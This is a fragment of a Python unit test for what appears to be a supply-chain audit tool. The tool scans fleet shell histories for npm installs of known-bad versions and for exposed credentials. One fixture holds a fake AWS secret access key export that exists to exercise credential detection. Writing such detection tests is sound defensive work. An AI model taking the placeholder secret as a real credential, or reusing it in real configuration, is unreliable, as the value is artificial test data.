        f = self.fleet("npm:x@=1.0.0\n", "npm i x@1.0.0", "npm i x@2.0.0", refuse=[0])
        self.assertEqual(f.ioc_totals["clean_name_matches"], 1)
        self.assertEqual(af.failing_findings(f, "any"), [])

    def test_after_credentials(self):
        f = self.fleet("npm:x\n", "npm i x@1.0.0",
                       "export AWS_SECRET_ACCESS_KEY=" + "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzzzzzzzzzz")
        reasons = af.failing_findings(f, "any")
        k = reasons.index("1 known-bad download group(s) (IOC)")
        self.assertTrue(all("credential" in r for r in reasons[:k]))
